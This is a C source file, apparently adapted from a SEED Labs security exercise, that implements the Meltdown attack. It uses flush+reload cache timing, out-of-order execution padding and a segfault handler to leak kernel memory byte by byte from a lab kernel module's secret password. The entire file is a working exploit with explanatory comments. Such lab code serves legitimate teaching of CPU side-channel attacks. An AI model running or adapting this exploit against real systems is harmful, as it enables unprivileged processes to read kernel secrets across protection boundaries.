//Modified version of the MeltdownAttack.c file from https://seedsecuritylabs.org/Labs_16.04/System/Meltdown_Attack/
#include <stdio.h>
#include <stdint.h>
#include <unistd.h>
#include <string.h>
#include <signal.h>
#include <setjmp.h>
#include <fcntl.h>
#include <x86intrin.h>

#define ARRAY_LENGTH (256)
#define PAGE_SIZE (4096)
#define CACHE_HIT_THRESHOLD (80)
#define DELTA (1024)

uint8_t array[ARRAY_LENGTH * PAGE_SIZE];
static int scores[ARRAY_LENGTH];

// Flushes array from the cache so it has to be requested from memory.
void flushSideChannel() { for (int i = 0; i < ARRAY_LENGTH; i++) _mm_clflush(&array[i * PAGE_SIZE + DELTA]); }

// Loads side channel and votes based on which pages are loaded before the threshold.
void reloadSideChannel()
{
    int junk = 0;
    register uint64_t time1, time2;
    volatile uint8_t *addr;
    int i;
    for (i = 0; i < ARRAY_LENGTH; i++) {
        addr = &array[i * PAGE_SIZE + DELTA];
        time1 = __rdtscp(&junk);
        junk = *addr;
        time2 = __rdtscp(&junk) - time1;
        if (time2 <= CACHE_HIT_THRESHOLD) scores[i]++; 
    } 
}

void getKernelData(unsigned long kernel_data_addr)
{
    char kernel_data = 0;
  
    //This assembly code is used to increase the likelihood of the CPU performing out-of-order execution.
    //While the dummy assembly code is run, the CPU will fetch the kernel memory out-of-order to optimize its utilization.
    asm volatile(
        ".rept 400;"
        "add $0x141, %%eax;"
        ".endr;"

        :
        :
        : "eax");

    //Kernel data is accessed and then used to index into array to load the page corresponding
    //to the value of kernel_data into the cache.
    kernel_data = *(char*)kernel_data_addr;
    array[kernel_data * PAGE_SIZE + DELTA] += 88;
}

static sigjmp_buf jbuf;

//Used to catch and ignore SIGSEGV signals.
static void catch_segv()
{
  siglongjmp(jbuf, 1);
}


int main(int argc, char *argv[])
{
  int i, j, ret = 0;

  //Setup signalhandler to catch SIGSEGV signals, when a memory access violation is made.
  signal(SIGSEGV, catch_segv);

  //Opens the virtual kernel module file.
  int fd = open("/proc/secret_password", O_RDONLY);
  if (fd < 0)
  {
    perror("open");
    return -1;
  }

  //Initialize array.
  for (int i = 0; i < ARRAY_LENGTH; i++) array[i * PAGE_SIZE + DELTA] = 0;
  
  
  printf("The secret password is: ");
  for (unsigned long addr = strtoul(argv[1], NULL, 0);; addr++)
  { 
      //Reset scores to zero.
      memset(scores, 0, sizeof(scores));

      flushSideChannel();

      //Repeat n times to increase odds of reading the memory correctly.
      for (i = 0; i < 1000; i++) {
          //Load kernel module into cache to reduce fetching time.
          ret = pread(fd, NULL, 0, 0);
          if (ret < 0) {
              perror("pread");
              break;
          }

          //Flush entire array.
          for (j = 0; j < ARRAY_LENGTH; j++) _mm_clflush(&array[j * PAGE_SIZE + DELTA]);

          //Perform the actual attack.
          if (sigsetjmp(jbuf, 1) == 0) getKernelData(addr);

          reloadSideChannel();
      }

      //Identify the highest score and assume this is the correct value at the memory location.
      int max = 0;
      for (i = 0; i < ARRAY_LENGTH; i++) {
          if (scores[max] < scores[i])
              max = i;
      }
      if (max != 0)
          printf("%c", max);
      else 
          break;
    }
    printf("\n");
    return 0;
}
